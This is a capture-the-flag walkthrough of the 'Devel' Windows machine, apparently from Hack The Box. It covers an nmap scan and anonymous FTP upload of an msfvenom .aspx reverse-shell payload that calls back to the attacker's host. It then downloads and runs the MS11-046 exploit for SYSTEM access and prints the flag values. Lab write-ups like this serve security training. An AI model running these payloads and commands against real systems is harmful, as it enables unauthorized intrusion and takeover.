# Devel - Easy

## Enumeration

`sudo nmap 10.129.232.230 -p- -sV -A -vv --open --reason -Pn`

Results:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 09:00 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:00
Completed NSE at 09:00, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:00
Completed NSE at 09:00, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:00
Completed NSE at 09:00, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 09:00
Completed Parallel DNS resolution of 1 host. at 09:00, 0.01s elapsed
Initiating SYN Stealth Scan at 09:00
Scanning 10.129.232.230 [65535 ports]
Discovered open port 21/tcp on 10.129.232.230
Discovered open port 80/tcp on 10.129.232.230
SYN Stealth Scan Timing: About 3.05% done; ETC: 09:16 (0:16:26 remaining)
SYN Stealth Scan Timing: About 11.51% done; ETC: 09:08 (0:07:49 remaining)
SYN Stealth Scan Timing: About 23.04% done; ETC: 09:06 (0:05:04 remaining)
SYN Stealth Scan Timing: About 36.36% done; ETC: 09:05 (0:03:32 remaining)
SYN Stealth Scan Timing: About 49.79% done; ETC: 09:05 (0:02:32 remaining)
SYN Stealth Scan Timing: About 63.18% done; ETC: 09:04 (0:01:45 remaining)
SYN Stealth Scan Timing: About 72.10% done; ETC: 09:04 (0:01:22 remaining)
SYN Stealth Scan Timing: About 83.43% done; ETC: 09:04 (0:00:48 remaining)
Completed SYN Stealth Scan at 09:04, 288.64s elapsed (65535 total ports)
Initiating Service scan at 09:04
Scanning 2 services on 10.129.232.230
Completed Service scan at 09:04, 6.35s elapsed (2 services on 1 host)
Initiating OS detection (try #1) against 10.129.232.230
Retrying OS detection (try #2) against 10.129.232.230
Initiating Traceroute at 09:05
Completed Traceroute at 09:05, 0.20s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 09:05
Completed Parallel DNS resolution of 2 hosts. at 09:05, 0.02s elapsed
NSE: Script scanning 10.129.232.230.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:05
NSE: [ftp-bounce 10.129.232.230:21] PORT response: 501 Server cannot accept argument.
Completed NSE at 09:05, 5.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:05
Completed NSE at 09:05, 1.18s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:05
Completed NSE at 09:05, 0.00s elapsed
Nmap scan report for 10.129.232.230
Host is up, received user-set (0.18s latency).
Scanned at 2023-05-11 09:00:02 EDT for 306s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.93%E=4%D=5/11%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=645CE804%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=10E%TI=I%II=I%SS=S%TS=7)
OPS(O1=M53CNW8ST11%O2=M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M53CNW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.013 days (since Thu May 11 08:46:43 2023)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   188.18 ms 10.10.14.1
2   188.29 ms 10.129.232.230

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:05
Completed NSE at 09:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:05
Completed NSE at 09:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:05
Completed NSE at 09:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 306.96 seconds
           Raw packets sent: 131348 (5.783MB) | Rcvd: 229 (10.788KB)
```

Possible areas to enumerate further:
```
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
```
1. FTP Anonymous Login

    ```
    ftp 10.129.232.230
    Connected to 10.129.232.230.
    220 Microsoft FTP Service
    Name (10.129.232.230:kali): Anonymous
    331 Anonymous access allowed, send identity (e-mail name) as password.
    Password: 
    230 User logged in.
    Remote system type is Windows_NT.
    ftp> ls
    229 Entering Extended Passive Mode (|||49180|)
    125 Data connection already open; Transfer starting.
    03-18-17  02:06AM       <DIR>          aspnet_client
    03-17-17  05:37PM                  689 iisstart.htm
    03-17-17  05:37PM               184946 welcome.png
    ```
    Enumeration of `aspnet_client` and it's folders yielded nothing.
2. HTTP Web Server (IIS7)

    Accessing `http://10.129.123.120` shows the default IIS page (`iisstart.htm`)

## Gaining Shell

Seems like I am able to upload files via FTP, and access it via port 80. Let's create a `msfvenom` payload, using `.aspx` extension as it is a Windows IIS server.

Payload:
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.77 LPORT=4444 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of aspx file: 2852 bytes
```

>The payload is `windows/shell_reverse_tcp` as we want a stageless payload. If the staged payload is used (`windows/shell/reverse_tcp`), the connection will be successful but will be dropped on the next input.

Using FTP anonymous login, and uploading the file via `put shell.aspx`, it can now be accessed via port 80, `http://10.129.123.120/shell.aspx`. Start the listener on the Kali and access `shell.aspx` - the shell is obtained.

```
nc -nlvp 4444                                                                          
listening on [any] 4444 ...
connect to [10.10.14.77] from (UNKNOWN) [10.129.232.230] 49191
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>
```
## Privilege Escalation
A shell is obtained, but it is neither a user shell nor root shell. 
```
whoami
iis apppool\web
```
Further enumeration is required.
```
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          11/5/2023, 3:46:47 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/11/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.472 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.555 MB
Virtual Memory: In Use:    586 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 4
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.232.230
                                 [02]: fe80::54a6:61dc:a17c:b445
                                 [03]: dead:beef::bcc1:40a5:ecb3:d3d3
                                 [04]: dead:beef::54a6:61dc:a17c:b445
```
Searching the OS name and version...
```
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
```
... yield an exploit! https://www.exploit-db.com/exploits/40564

Download and compile the exploit as per the instructions: `i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32`

Transfer `MS11-046.exe` from Kali over to `C:\Windows\Tasks`.
> I first transferred `wget.exe` via FTP anonymous login, and used `wget` to download off my Kali (`sudo python3 -m http.server 80`), with `C:\inetpub\wwwroot\wget.exe http://10.10.14.77/MS11-046.exe`. Unsure if transferring directly with FTP (binary mode) will affect it.

Easy root:
```
C:\Windows\Tasks>.\MS11-046.exe
.\MS11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

Get both flags. GG.
```
C:\Users\babis>type Desktop\user.txt
type Desktop\user.txt
0d498bdeb6fafca4d7e3be3dbe9c7aff

C:\Users\babis>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
29f3a7cffba6060bb43f01b6382152cc
```